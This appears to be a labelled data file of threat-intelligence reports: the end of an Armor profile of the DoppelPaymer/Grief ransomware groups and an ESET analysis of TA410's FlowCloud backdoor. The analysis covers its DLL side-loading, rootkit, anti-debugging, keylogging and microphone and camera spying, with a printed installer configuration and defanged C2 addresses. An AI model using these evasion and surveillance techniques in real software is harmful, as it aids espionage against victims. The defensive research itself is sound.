:BIN alternate data stream to a hidden directory in %APPDATA%\<random>.exe. — Creates a temporary ‘.cmd’ file in %temp% directory and writes the following (Figure 8).Figure 8: Cmd file that will be executed from registry (Source: Morphisec) Some of its variants used in many attacks are signed using what appears to be stolen certificatesfrom OFFERS CLOUD LTD, which may be trusted by various security solutions.16IMPACT They deploy the ransomware over the weekend and night—first on DC servers as critical resources,including on data backup systems, to maximize impact. They change user passwords before forcing a system restart into safe mode to prevent user entry fromthe system. They then change the notice text that appears before Windows proceeds to the login screen. They used url for exfiltration via a web browser. Other TTPs include: gaining access to Hyper Visors and spinning up new virtual machines to launch the ransomware from inside them. They spun up a few different VMs logged into them, disabled defender, and then launched the ransomware from the desktop. They then used that to encrypt the vhdx files on the host. (This means that the VM is using a bridged interface to do this in order to spread across network while evading PSPs.) For Grief to set the system to boot from safe mode with minimum services available and no networkconnectivity is remarkable because very few ransomware families do this. They used ProcessHacker to terminate different services on endpoint devices that may interfere with file encryption. They also used an interesting technique for this method where the application is bundled with a kernel driver that can be used to terminate processes and services.17VICTIMOLOGYDoppelPaymer was used in over 125 ransomware incidents in 2020.DoppelPaymer Gang was one of the most active ransomware groups, claiming to have infected 186 companies and public entities between 2019 and May 1, 2021. DoppelPaymer is considered one of the top ransomware groups, coming in just behind the Sodin/REvil, Conti/Ryuk, Black Matter (formerly Darkside), and CLOP groups.MOST NOTABLE INCIDENTS OF ALL THE RANSOMWARE VARIANTSAug. 25, 2017BitPaymer notably compromised multiple Scottish hospitals as well as targeted entities in education, manufacturing, finance, and agriculture.Aug. 1, 2018Matanuska-Susitna, a borough of Anchorage, Alaska, was infected with the Emotet trojan and subsequently infected with the BitPaymer ransomware, forcing the borough to use typewriters for a week.17Aug. 8, 2018PGA of America was likely infected with a BitPaymer variant.1818July 18, 2019An ongoing BitPaymer campaign targeted at least 15 U.S. small and medium-sized businesses (SMBs) spanning across the financial, agricultural, technology, and government sectors over the last three months. The infection began with an email containing Dridex, which was used to collect network information. BitPaymer appeared to be deployed during a weekend while employees were away and proliferated once employees returned.19Oct. 10, 2019The actors behind BitPaymer exploited a zero-day vulnerability in iTunes for Windows to evade detection on compromised systems.20Nov. 12, 2019Pemex, Mexico’s state-owned oil company, recently suffered a DoppelPaymer ransomware attack that demanded $4.9 million USD in order to decrypt their files.21Sept. 18, 2020The most known and discussed victim of DoppelPaymer ransomware was one against Düsseldorf University Clinic in Germany in September 2020. The actors actually wanted to target the Düsseldorf University and addressed it in the ransom note, but ended up hitting the hospital. When the perpetrators were made aware, they sent a digital key to get the hospital up and running again. But that ransomware infection led to the death of one patient who the hospital was unable to treat on arrival. She died in an ambulance while being transported to another medical facility with functioning systems. The threat actors also fixed their sights on a county E911 center as well as another community college in the same month.22Dec. 15, 2020The FBI issued a warning regarding DoppelPaymer, a ransomware family that first appeared in 2019 when it launched attacks against organizations in critical industries. Its activities continued throughout 2020, including a spate of incidents in the second half of the year that left its victims struggling to properly carry out their business operations. According to the FBI notification, DoppelPaymer’s primary targets were organizations in healthcare, emergency services, and education. The ransomware already had been involved in a number of attacks in 2020, including disruptions to a community college as well as police and emergency services in a city in the U.S. during the middle of the year.23May 27, 2021The Grief Ransomware Gang (a rebrand of the DoppelPaymer Ransomware Group) claimed to have infected 41 new victims between May 27, 2021, and Oct. 1, 2021, with their ransomware. Over half the companies listed on Grief’s underground leak site were based in the U.K. and Europe. The Grief Ransomware Gang appeared to have altered its motus operandi (MO), targeting more corporate and public entities in the U.K. and Europe than the United States. They also seemed to be backing away from U.S. hospitals and emergency healthcare services, previously a top target for them.2419GEOGRAPHIC DISTRIBUTION OF TARGETSUS59%EUROPE18%MIDDLE EAST14%AFRICA5%LATAM4%INDUSTRY DISTRIBUTION OF TARGETS23%18%14%9% 9%MANUFACTURINGLOGISTICSFINANCEENERGYREAL ESTATEGOVERNMENTSERVICESTRAVELCOMMERCEDEFENSETELECOM5% 4%20SOURCES1. “Treasury Sanctions Evil Corp, the Russia-Based Cybercriminal Group Behind Dridex Malware” –December 5, 20192. “Updated Advisory on Potential Sanctions Risks for Facilitating Ransomware Payments” –September 21, 20213. “BitPaymer Source Code Fork: Meet DoppelPaymer Ransomware and Dridex 2.0” – July 12, 2019 4. “Just got sample of “Bit paymer” #ransomware. Ext “.locked” w/ marker, drops “.readme_txt” for every encrypted file. url Gillespie, Michael [@demonslay335], Twitter, July 10, 20175. “YARA Hunting for Code Reuse: DoppelPaymer Ransomware & Dridex Families” – November 14, 2019 6. “FriedEx: BitPaymer ransomware the work of Dridex authors” – May 2, 2018 7. “The Malware Dridex: Origins and Uses” – July 17, 2020 8. “Big Game Hunting: The Evolution of INDRIK SPIDER From Dridex Wire Fraud to BitPaymer TargetedRansomware” – November 14, 20189. “Blockchain Analysis Shows Connections Between Four of 2020’s Biggest Ransomware Strains” –February 4, 202110. “The Evolving Maturity in Ransomware Operations” – December 2020 11. “Identification of a new cybercriminal group : Lockean” – November 3, 2021 12. “C2 With It All: From Ransomware To Carding” – November 4, 2019 13. “New Dridex Variant Being Spread By Crafted Excel Document” – September 10, 2021 14. “Fileless, UAC Bypass Using Eventvwr.exe and Registry Hijacking” – August 15, 2016 15. “Create or Modify System Process: Windows Service” – January 17, 2020 16. “Hide Artifacts: NTFS File Attributes” – March 13, 2020 17. “The MSB 2018 Virus Situation” – July 30, 2018 18. “Hackers target PGA servers, seek Bitcoin ransom” – August 8, 2018 19. “BitPaymer targets 15 U.S. organizations in 3 months, researchers say” – July 18, 2019 20. “Apple Zero-Day Exploited in new BitPaymer Campaign” – October 10, 2019 21. “Mexico’s Pemex Oil Suffers Ransomware Attack, $4.9 Million Demanded” – November 12, 2019 22. “Woman dies after hospital is unable to treat her during crippling ransomware infection, cops launchprobe” – September 18, 202023. “Private Industry Notification” – December 10, 2020 24. “Ransomware gang threatens to wipe decryption key if negotiator hired” – September 15, 202121ARMOR.COM | (US) +1 844 682 2858 | (UK) +44 800 500 3167 "," 1. Initial access via phishing, exploiting vulnerabilities etc. 2. Dridex and/or other malware deployed on endpoints 3. Lateral movement with credential theft and privilege escalation 4. Ransomware deployed across network 5. Data encryption and theft 6. Extortion demands to decrypt files and prevent leak ",valid_36,"['initial access', 'phishing', 'Dridex', 'other malware', 'end', 'LATERAL MOVEMENT', 'credential theft', 'privilege escalation', 'RANSOMWARE', 'network', 'data', 'encryption', 'files', 'leak']",initial access; phishing; Dridex; other malware; end; LATERAL MOVEMENT; credential theft; privilege escalation; RANSOMWARE; network; data; encryption; files; leak.
"www.welivesecurity.com /2022/04/27/lookback-ta410-umbrella-cyberespionage-ttps-activity/ A lookback under the TA410 umbrella: Its cyberespionage TTPs and activity ⋮ 4/27/2022ESET researchers reveal a detailed profile of TA410: we believe this cyberespionage umbrella group consists of three different teams using different toolsets, including a new version of the FlowCloud espionage backdoor discovered by ESET.ESET researchers reveal a detailed profile of TA410: we believe this cyberespionage umbrella group consists of three different teams using different toolsets, including a new version of the FlowCloud espionage backdoor discovered by ESET.ESET researchers have documented and analyzed TA410 activity going back to 2019. TA410 is a cyberespionage umbrella group loosely linked to APT10, known mostly for targeting US-based organizations in the utilities sector, and diplomatic organizations in the Middle East and Africa. TA410 has been active since at least 2018 and was first publicly revealed in August 2019 by Proofpoint in its LookBack blogpost. A year later, the then-new and very complex malware family called FlowCloud was also attributed to TA410.In this blogpost, we provide a detailed profile of this APT group, including its modus operandi and toolset that includes a new version of FlowCloud, discovered by ESET. This very complex backdoor contains interesting espionage capabilities. ESET will present its latest findings about TA410, including results from ongoing research, during Botconf 2022. For YARA and Snort rules, consult ESET’s GitHub account.Key points in this blogpost:TA410 is an umbrella group comprised of three teams ESET researchers named FlowingFrog, LookingFrog and JollyFrog, each with its own toolset and targets. ESET telemetry shows victims all around the world, mainly in the governmental and education sectors. TA410 had access to the most recent known Microsoft Exchange remote code execution vulnerabilities, e.g., ProxyLogon in March 2021 and ProxyShell in August 2021. ESET researchers found a new version of FlowCloud, a complex and modular C++ RAT. It has several interesting capabilities, including:Controlling connected microphones and triggering recording when sound levels above a specified threshold volume are detected. Monitoring clipboard events to steal clipboard content. Monitoring file system events to collect new and modified files. Controlling attached camera devices to take pictures of the compromised computer’s surroundings.FlowCloud deploys a rootkit to hide its activity on the compromised machine. The LookBack backdoor utilized by TA410 uses a custom network protocol, which can function over HTTP or raw TCP, for C&C server communications. TA410 is one of the users of the Royal Road malicious document builder.TA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specifically, with the attackers choosing which entry method has the best chance of infiltrating the target.The first stage of the FlowCloud version identified by ESET researchers can check whether specific security software is installed on the machine it tries to compromise, but this isn’t implemented in the loaders we analyzed. However, we1/26found a custom AntivirusCheck class, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products. In case one of these products is detected, FlowCloud goes through its regular loading process and cancels the auto_start_after_install configuration value.Even though we believe that this version of FlowCloud is still undergoing development and testing, the cyberespionage capabilities of this version include the ability to collect mouse movements, keyboard activity, and clipboard content along with information about the current foreground window. This information can help attackers understand stolen data by contextualizing it.FlowCloud can also gather information about things happening around the victim’s computer by taking pictures using connected camera peripherals and recording audio using a computer’s microphone. This latter function is triggered by any sound over a threshold of 65 decibels, which is in the upper range of normal conversation volume. AttributionESET researchers believe that TA410 is composed of three different teams, using very similar tactics, techniques, and procedures (TTPs) but different toolsets and exiting from IP addresses located in three different districts. These teams, referred to below as FlowingFrog, LookingFrog, and JollyFrog, have overlaps in TTPs, victimology and network infrastructure.FlowingFrog uses Royal Road RTF documents, a first-stage implant called Tendyron, and a very complex second-stage backdoor called FlowCloud. LookingFrog uses a first-stage backdoor called X4, and LookBack as a second stage. JollyFrog uses only generic malware families such as Korplug (aka PlugX) and QuasarRAT. Part of the activity of this team was described by Fortinet, who attributed the activity to APT10. ESET researchers, however, believe this activity is different from the operations that APT10 (aka A41APT) has conducted recently.FlowingFrog and JollyFrog share network infrastructure – more precisely, the domain ffca.caibi379[.]com, as mentioned by Proofpoint.FlowingFrog and LookingFrog ran a phishing campaign at the same time against the same targets, as also mentioned in the same Proofpoint article.In ESET telemetry, we do not see any other overlap between these subgroups. We believe that these subgroups operate somewhat independently but that they may share intelligence requirements, an access team that runs their spearphishing campaigns, and also the team that deploys network infrastructure. VictimologyMost TA410 targets are high-profile organizations in the diplomacy and education sectors, but we have also seen victims in the military sector, a manufacturing company in Japan, a mining company in India, and a charity in Israel. According to ESET telemetry, the victims are located in Africa, Asia, the Middle East, and Europe. Interestingly, there is no clear segmentation of the targeting (by sector or geography) among the different teams.An element worth mentioning is that TA410 targets foreign individuals in China. In ESET telemetry, we have observed this as having happened at least twice: for instance, one victim is a French academic, and another is a member of a diplomatic mission of a South Asian country in China.Since 2018, we have seen the following targets, also depicted in Figure 1:FlowingFrog: University, foreign diplomatic mission of a South Asian country in China, mining company LookingFrog: Diplomatic missions, charity, government and industrial manufacturing JollyFrog: Education, church, military, diplomatic mission2/26Figure 1. Map of countries and verticals targeted by TA410 Initial compromise and typical TTPsIf we exclude the different backdoors, the three teams use a similar modus operandi. They compromise their targets either by spearphishing, according to Proofpoint, or, for LookingFrog and JollyFrog, by compromising a web-facing application such as Microsoft Exchange or SharePoint. This could indicate that victims are targeted specifically, with the attackers choosing which entry method is the best for a given target.The public-facing application compromise approach is what we have seen the most. Attackers linked to LookingFrog exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604. They then dropped an ASPX webshell that was used to install other malicious components. These were either dropped directly via the webshell or downloaded from a remote server using certutil.exe, a known LOLBin.In 2020, we saw further exploitations by JollyFrog, of Microsoft SQL servers and IIS servers running custom applications.In August 2021, we observed LookBack being loaded by an IIS worker process on a server belonging to an industrial manufacturing company in Japan. This happened following the exploitation of the Exchange ProxyShell vulnerability on that server, as we describe in ESET Threat Report T3 2021.This shows that LookingFrog operators closely follow the discovery of RCE vulnerabilities in popular server applications and quickly make use of any available exploit in order to gain control of unpatched servers run by organizations on their target lists.In addition to the full-featured backdoors analyzed in the following sections, these attackers use a variety of tools such as vulnerability scanners, exploits from the Equation Group leaks, proxy/tunneling utilities (HTran, LCX, EarthWorm), and lateral movement scripts such as WMIExec. Arsenal TA410 – FlowingFrogFlowingFrog uses a first stage that ESET researchers have named the Tendyron downloader, and a complex second stage named FlowCloud, so named by the developers in its modules’ PDB paths.Royal Road and Tendyron downloaderRoyal Road is a malicious document builder used by several cyberespionage groups (see the analysis by nao_sec). Files built with this tool are RTF documents exploiting Equation Editor N-day vulnerabilities such as CVE-2017-11882. TA410 operators always use the Royal Road encoding bytes: A9 A4 6E FE, as seen in Figure 2.3/26Figure 2. Encoded Royal Road payloadOn October 13th 2020, we noticed that a new Royal Road RTF document, shown in Figure 3, had been uploaded to VirusTotal.Figure 3. Royal Road RTF document found on VirusTotal (SHA‑1: ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20)When opened, the document triggers the injection of a custom downloader – a PE executable – into an iexplore.exe process. The PE resources 103, 104 and 105 contain the payload URLs, XORed with 0xD3. The following files are downloaded and written to disk:url written to %localappdata%\Tendyron\Tendyron.exe (SHA-1: 09C76522136B5E9BAB74381FEEE265F7E9B1D550) url written to %localappdata%\Tendyron\OnKeyToken_KEB.dll (SHA‑1: F359D3C074135BBCA9A4C98A6B6544690EDAE93D) url written to %localappdata%\Tendyron\Tendyron.conf (we were not able to retrieve this file)Finally, this process separately downloads url (resource 101), loads it into memory, and calls its startModule export. Unfortunately, we were not able to retrieve this sample.Tendyron.exe is a legitimate executable, signed by online-banking security vendor Tendyron Corporation, and that is vulnerable to DLL search-order hijacking. Persistence for the downloaded payload is established via the Tendyron4/26value under the Run key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.When executed, Tendyron.exe loads the malicious OnKeyToken_KEB.dll. The export OnKeyT_ContextInit contains code that decrypts hardcoded shellcode (see Figure 4) and injects it into iexplore.exe using WriteProcessMemory.Figure 4. Shellcode decryption loopThe next stage, injected into iexplore.exe, is a backdoor written using the Microsoft Foundation Class (MFC) framework. It also contains RTTI symbols and thus a few C++ class names:ClientSocket KernelManagerThese class names are the same as used in Farfli/Gh0stRAT, a backdoor that has been used for more than 10 years to conduct (mostly) cyberespionage operations. Its source code was leaked and is now available on GitHub. Thus, we believe that TA410 developers reused code copied from Farfli.The C&C server is hardcoded, in cleartext, in the sample; in this specific case, it is set to 114.118.83[.]141.On VirusTotal, as shown in Figure 5, we can see one more HTTP request to 103.139.2[.]93 was triggered during the execution of the RTF file. The result of the request to url was recorded by VirusTotal and the SHA-1 of this encrypted file is 140F81037A76B7B16A00E1D5E0E2CD9F6687F642. This URI is typical of those used to download FlowCloud, a complex C++ implant described in the next section.Figure 5. URL requests seen by the VirusTotal sandbox during execution of the malicious RTF documentThe identical encrypted file was also downloaded from url by a FlowCloud dropper version 4.1.3 (SHA‑1: 014421BDB1EA105A6DF0C27FC114819FF3637704). A summary of the compromise chain is provided in Figure 6.5/26Figure 6. Compromise chain from the Royal Road document to FlowCloudFlowCloudFlowCloud is a complex implant written in C++. It consists of three main components, deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis. Multiple versions of FlowCloud have been identified since 2020, most notably versions 4.1.3 and 5.0.1 described by Proofpoint. In this section, we analyze FlowCloud versions 5.0.2 and 5.0.3. Contrary to those previously found, the samples we obtained for version 5.0.2 contain verbose error messages and meticulous logging.This deployment process is very similar to the one described by Proofpoint for version 5.0.1. The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor. We describe these in detail in the upcoming sections.Loader (ClientLdrExe)The first stage is responsible mostly for creating the files and registry keys used by the other stages. The values for these executables and configuration data can be found, encrypted, in the loader’s resource section. Table 1 contains an overview of these resources and their use.Table 1. Contents of the dropper’s resourcesResource ID 102FlowCloud RAT DLL 32-bit rootkit driver 64-bit rootkit driverRoleInternal namefcClientDll Driver Driver6/26Resource ID 10000RoleInternal nameN/A DLL hijacking vulnerable app SETLANG_dlcore Shellcode loaded by the malicious library in the DLL hijacking N/A Shellcode that loads fcClient (unused) fcClient Final dropper stage fcClientWD_x86 32-bit persistence module fcClientWD_x64 64-bit persistence module slam Legitimate library used for module stomping XXXModule_dlcore0 DLL used for hijacking N/A Protobuf serialized FlowCloud configuration Used as an alternative or extension to resource 2001 N/A Path to the registry key for the PrintProcessor service (used by the driver) N/A N/A Installation configurationIn the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed. In some cases, they are then re-encrypted but with a different key. This technique makes it harder to dump the plaintext values from the process’s memory and to analyze exit dumps. The paths and registry keys to use, and whether they should be decrypted before being written, are defined in the installation configuration. The samples we analyzed all store their files in the %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\ directory; we believe that this is the default value. FlowCloud uses filenames that are either similar to those of legitimate Windows files (e.g., rebare.dll which could be mistaken for rebar.dll) or innocuous looking (e.g., AC146142) to avoid suspicion.Figure 7 presents a graphical overview of the deployment process and its elements. We explain each of the steps in further detail in the upcoming sections.7/26Figure 7. FlowCloud deployment processFirst, the loader decrypts and parses the embedded installation configuration, which uses the Windows INI format. This configuration defines the malware’s install path along with the filename or registry key where each embedded resource is to be written. The same values are hardcoded in the following stages, which leads us to think that the samples are generated using a builder. In a sample we analyzed, this configuration is accompanied with comments explaining the values for some sections. Figure 8 shows this installation configuration with the comments translated to English.123456789#Product name, these will be used in the configuration generator and applied to the front end[product]product_chs_name=Sky Arrowproduct_name=PCArrowIproduct_version=v5.0.2[general]created_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msoleinstall_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole8/2610data_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\fcdata1112hide_user_activity_tab = 01314#File path, not including drive letter15[file]16100=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\responsor.dat17103=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlang.exe18104=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlangloc.dat19#105=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rebare.dat20106=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure.dat21107=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure86.dat22108=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure64.dat23109=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\sspisrvui.dat24110=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlangloc.dll25101=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\E86F36C426102=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\AC146142271000=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\E19D9D4B2829#0x0001 Release without decryption30#0x0002 Decryption release31[file_out_type]32100=0x000133103=0x000234104=0x000235#105=0x000236106=0x000237107=0x000238108=0x000239109=0x000240110=0x000241101=0x000142102=0x0001431000=0x000144##Registry path: separated by'|', respectively representing HKEY_LOCAL_MACHINE, path name, value name[key]##100=0x80000002|SYSTEM\Setup\PrintResponsor|1#101=0x80000002|SYSTEM\Setup\PrintResponsor|2#102=0x80000002|SYSTEM\Setup\PrintResponsor|3#1000=0x80000002|SYSTEM\Setup\PrintResponsor|4##2000=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|1##2001=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|22001=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|1454647484950515253549/265556##0x0001 Release without decryption57##0x0002 Decryption release58[key_out_type]59##100=0x000160#101=0x000161#102=0x000162#1000=0x000163#2000=0x0002642001=0x00026566#Service Information: hhw.exe needs to be dynamically generated67[service_attribute]68is_hhw=069service_name=PrintResponsor70service_path=%ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\setlang.exeservice_parm=Figure 8. Installation configuration with explanatory comments. Note that some fields are commented out.The configuration can also contain a section defining specific security software to check for, but this isn’t implemented in the loaders we analyzed. However, there is a custom AntivirusCheck class, which can check running processes against a hardcoded list of XOR-encrypted executable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus, Kingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro. This class is only used if the loader is set to directly start the fcClient module via the auto_start_after_install configuration key.Depending on the configuration keys used, the loader can either load the fcClientDll RAT module directly, thus bypassing most of the complex deployment process, or it can create a service or scheduled task. In the former case, the task or service attains persistence by being set to start automatically on boot. In the samples we observed, the task or service was configured to execute the next step of the installation process by running a legitimate application vulnerable to DLL search-order hijacking. The application and the accompanying relevant and malicious DLL were both embedded in the loader’s resources.DLL side-loading (XXXModule_dlcore0)In the samples we analyzed, the vulnerable application was either setlang.exe from Microsoft Office 2003 with a malicious setlangloc.dll or vpreview.exe from Visio Preview 2007 with a malicious vviewres.dll. Strings contained in the malicious DLL also point to emedres.dll from Emurasoft’s EmEditor as a possible third target for DLL side-loading. This is a real possibility as such vulnerabilities were present in older versions of EmEditor, but we did not see any samples using it.In all observed samples, the malicious library is the same and serves to load and execute shellcode from a file that is stored under the same name as the DLL, but with a .dat extension. We analyze this shellcode in the next section, but first, we want to look at the notable anti-analysis techniques used in this library.Despite its relatively simple goals, the library’s code makes heavy use of anti-debugging tricks and control flow obfuscation to hinder analysis. In the function that loads the next file, the useful code is repeatedly interspersed with the same sequence of opcodes to obfuscate the program’s flow. As shown in Figure 9, this short snippet is packed full of anti-analysis tricks, but ultimately amounts to an unconditional 16-byte jump. This is enough to foil many automatic analyses, including decompilers.10/26Figure 9. Annotated disassembly of the control flow obfuscation snippetThe above snippet is bookended by calls to two anti-debugging functions, as can be seen in Figure 10. The function, which we named crash_if_debugger in the previous screenshot, calls IsDebuggerPresent and checks some commonly hooked library functions for a breakpoint as their first instruction. If those checks detect a debugger, the function returns a value that will cause the program to jump to an invalid address and crash. The second one raises an exception via the INT 0x2D instruction and exits if it was handled by a debugger.Figure 10. Decompiler view showing the obvious pattern of anti-debugging checks. Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output.fcClient (rescure.dat)When it is first executed, this module sets up persistence and installs the backdoor, rootkit, and persistence modules. It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.First, persistence is established by using the ITaskService COM interface to create the \Microsoft\Windows\CertificateServicesClient\NetTask scheduled task. If a task with the same name already exists, it is deleted before the new one is created. This task will run the DLL hijacking target as SYSTEM at each boot.Afterwards, the rootkit module is decrypted and written to the %System%\drivers folder as hidmouse.sys. A hidmouse service is then created to run that module and is immediately started. The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver from the same folder. Thus, anyone looking at the file on disk rather than the one mapped into memory would see a legitimate, benign file.On Windows 10 machines, the system time is briefly changed to make it look like the service was created in January 2013. Both this and the use of the legitimate driver directory help the rootkit blend in with other drivers.The following files are copied to the %System% directory:The backdoor: rescure.dat A decoy DLL: sspisrvui.dat as sspisrvui.dll (timestomped to July 2013) The encrypted shellcode: rebare.datThe rebare.dat shellcode is very similar to that used in the self-decrypting DLL, but it loads fcClient directly.FlowCloud then starts a suspended process to perform injection on it. This process is created via CreateProcessAsUserW using a token retrieved from the explorer.exe or winlogon.exe process in the current session.The injected code loads the same backdoor (rescure.dat) into the process’s memory and calls its startModule export to finish the installation. Meanwhile, the injection process is terminated.11/26At this point, installation of the backdoor is complete. All that is left is to execute the backdoor. To achieve this, the new process loads the decoy DLL and manually replaces its content in memory with the fcClientDll module (a process known as module stomping or DLL hollowing), before calling its main function.fcClientDll (responsor.dat)This complex module is the main component of the backdoor. It provides a wide range of capabilities from full file system access to control of camera peripherals and everything in between. Although we did not observe any plug-ins, the backdoor contains code that hints that they can be used to further extend functionality.Before diving deeper into the functionalities, we want to highlight some notable characteristics:Configuration information and data for communications with the C&C server are Protobuf-serialized, compressed, and encrypted. File exfiltration is done through encrypted, Protobuf-serialized structures and is disguised as HTTP by prepending the data with a hardcoded, fake POST request. The Content-Length header is the only variable element, as it is set to the actual size of the data sent. This hardcoded request can be seen in Figure 11. Chrome/49.0.2623.87 Safari/537.36Content-Type: application/x-amfAccept: */*Referer: url gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: COOKIE_SUPPORT=true; JSESSIONID=5C7E7A60D01D2891F40648DAB6CB3DF4.jvm1; COMPANY_ID=10301; ID=666e7375545678695645673d; PASSWORD=7a4b48574d746470447a303d; LOGIN=6863303130; SCREEN_NAME=4a2b455377766b657451493d; GUEST_LANGUAGE_ID=en-USFigure 11. Hardcoded, fake HTTP POST request used for FlowCloud C&C communicationThis component uses an encrypted, Protobuf-serialized configuration that it tries to read from a file on disk or a registry key. The configurations we observed were composed of three sections:1. server_config: This section contains information about the C&C servers and identification information about thevictim and backdoor.2. policys [sic]: This section defines the behavior of the backdoor’s components and is described in detail in thefollowing paragraphs.3. install_config: As the name indicates, this section defines the installation parameters.An example of such a server_config is shown in Figure 12. This configuration corresponds to resource 1000 in the initial loader. It defines the address and port for both the exfiltration server (file_server) and the C&C server (exchange_server), along with the encryption key to use for communication with each. A fallback server can also be defined for each of these. The file_key field defines the encryption key to use when storing files that are to be exfiltrated. The other entries are used to identify the backdoor and the victimized host:product_name: A name for the backdoor in use. PCArrowI seems to correspond to FlowCloud. product_version: The backdoor’s version. id_prefix: This value is prefixed to the generated ID. Presumably, used to group victims or campaigns. id: This value uniquely identifies the victim. Initially, it is empty; the value is generated on the first execution using the following format: <prefix>_<current timestamp>_<machine hostname>1234server_config{product_name: “PCArrowI""12/2656789product_version: ""v5.0.2""id: ""1202_[REDACTED]""root: """"file_server: ""47.111.22[.]65""file_server_port: ""80""10file_server_bak: """"11file_server_bak_port: """"12exchange_server: ""47.111.22[.]65""13exchange_server_port: ""81""14exchange_server_bak: """"15exchange_server_bak_port: """"16file_server_key: ""E\367\016\031<…>""17xchg_server_key: ""8\335\325$<…>""18file_key: ""U\267\323\353\<…>""19is_audio_only: false20id_prefix: ""1202""21}22Figure 12. server_config section of a decoded FlowCloud configurationFlowCloud’s capabilities are spread out over a series of singleton classes, each of which implements a cohesive set of functionalities related to a specific type of data or action. These roughly follow an internal naming convention where classes with names ending with manager_handler perform actions in response to C&C commands, while those whose names end with manager automatically perform actions based on timers or event listeners.Each manager stores collected data in its own SQLite database, while data that is collected on demand is returned directly to the C&C server. Data is encrypted with the aforementioned file_key before being inserted into the database. The location of the SQLite databases is defined by the data_folder install configuration key, with the default value being %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\fcdata.The classes are orchestrated by an instance of fc_kernel_manager. This object is responsible for initializing other components and handling C&C connections. It can also update the local configuration when the corresponding command is received.As shown in Figure 13, parameters and frequency of automated actions can be specified and finely tuned through configuration policies. Data exfiltration is likewise automated: policies can contain a cache_size or cache_count parameter, which determines how much data can be collected locally by the corresponding class before it is staged for exfiltration.policys {guid: ""XXXX-XXXX-XXXX-XXXX- 30filter: ""*.doc""filter: true14/26b_exclude_system_folders: true}installedapp_policy false}}Figure 13. The policys [sic] section of a decoded FlowCloud configAs we have previously mentioned, this implant uses a lot of classes. Rather than documenting each of them individually, we will present an overview of the available functionality by grouping them into three categories: those that interact with the file system, functionalities that collect information about programs and processes, and those that gather real-time information about user activity.File systemFlowCloud provides interaction with the file system in a variety of ways, most of which can store file metadata and content in their SQLite database.One of these is a component that walks through all mapped file systems and collects files that are not excluded by filters in the smfile_search_policy. It also creates an invisible window that listens for file creation, modification, or renaming events. The corresponding files are collected unless they are excluded by that policy.Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data. This same class collects file and directory metadata.As a complement to these automated measures, the backdoor implements functions that provide full access and control over the content of mounted drives. This includes bidirectional file transfers between the C&C and the compromised machine.Programs and processesFlowCloud is able to automatically obtain a list of installed software through the use of the undocumented IShellAppManager COM interface. This functionality can also be invoked via a C&C command. Figure 14 shows, after the extraneous code has been removed, how that interface is used.15/26Figure 14. Simplified code showing how the IShellAppManager COM interface is used to list installed applicationsOther commands can be used to retrieve a detailed list of available services and currently running processes.Another interesting feature is the near real-time monitoring of process activity. To achieve this, FlowCloud runs WMI queries every second to get all process creation and termination events. The obtained information is correlated with data from the Win32_Process table for a more detailed view.User activityFlowCloud is able collect a miscellany of data that we have decided to group under the “User activity” umbrella.It has the ability to monitor the clipboard for changes and save any data it contains. As seen in Figure 15, it achieves this by creating an invisible window with a custom class and registering two clipboard formats. This window uses AddClipboardFormatListener (on Windows Vista or more recent) or SetClipboardViewer (on Windows XP and prior) to listen for clipboard content changes.Figure 15. Set up monitoring of the clipboardCollected clipboard content is stored along with information about the current foreground window. This information can help attackers understand the data by contextualizing it.FlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input. To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture aren’t saved. This feature can also be invoked on demand by the server.Another of the backdoor’s components records mouse and keyboard activity to a database. It does not collect these directly, but instead acts in tandem with the keylogger component of the driver (described in the next section) by reading data from the \\.\pipe\namedpipe_keymousespy_english named pipe.Interestingly, FlowCloud can also gather information about things happening around the victim’s computer. The first way it does so is through a C&C command that takes a picture using connected camera peripherals. This feature is implemented using the CCameraDS class from OpenCV.The second way it can collect information about the computer’s surroundings is by recording audio. Much like a voice assistant, FlowCloud can use a computer’s microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the decibel_limit16/26field of the audio_policy. The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources).Self-decrypting DLL (setlangloc.dat)The loaded shellcode is a self-decrypting DLL. It first decrypts the embedded DLL using a byte-oriented XOR-and- ADD scheme (shown in Figure 16). The shellcode we analyzed used the key 0x7B. Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded module’s startModule export.1for (int i=0; i < 